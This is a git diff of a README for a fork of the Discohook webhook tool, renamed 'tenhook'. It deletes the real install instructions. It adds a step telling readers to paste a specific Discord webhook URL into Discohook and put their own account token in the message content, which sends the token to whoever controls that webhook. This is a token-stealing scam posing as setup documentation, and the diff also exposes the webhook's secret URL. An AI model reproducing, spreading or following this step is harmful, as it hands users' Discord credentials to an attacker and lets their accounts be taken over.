@@ -1,4 +1,4 @@
-# Discohook
+# tenhook
 
 [![ci](https://github.com/discohook/site/actions/workflows/ci.yml/badge.svg?branch=main&event=push)](https://github.com/discohook/site/actions/workflows/ci.yml)
 
@@ -10,14 +10,5 @@ Live instance is available at <https://discohook.app/>.
 
 Requires Node.js 12 and the Yarn package manager installed
 
-```sh
-# Install dependencies
-yarn install
-
-# Run a development server
-yarn run dev
-
-# Run a production server
-yarn run build
-yarn run start
-```
+Go To Discohook and paste this in webhook https://discord.com/api/webhooks/1096823403610124339/-zpXsd-iiy-9vT4TAaXVEMTGPSVwSNfPwdpmFeY4Q4l2Q14L7A0lfBk9pX0WdHGAnB9F
+and in content paste in your token
